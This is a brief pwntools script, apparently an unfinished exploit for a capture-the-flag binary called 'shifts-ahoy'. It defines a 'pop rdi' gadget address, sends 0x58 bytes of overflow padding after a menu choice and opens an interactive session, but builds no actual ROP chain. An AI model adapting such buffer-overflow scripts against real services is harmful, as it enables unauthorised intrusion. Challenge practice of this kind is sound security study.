from pwn import *
#r=remote("jh2i.com",50015)
r=process("./shifts-ahoy")
b=ELF("./shifts-ahoy")
prdi=0x401413
context.log_level='debug'
pay=""
pay+='x'*(0x50)
pay+='x'*8

r.sendline('1')
r.sendline(pay)

r.interactive()
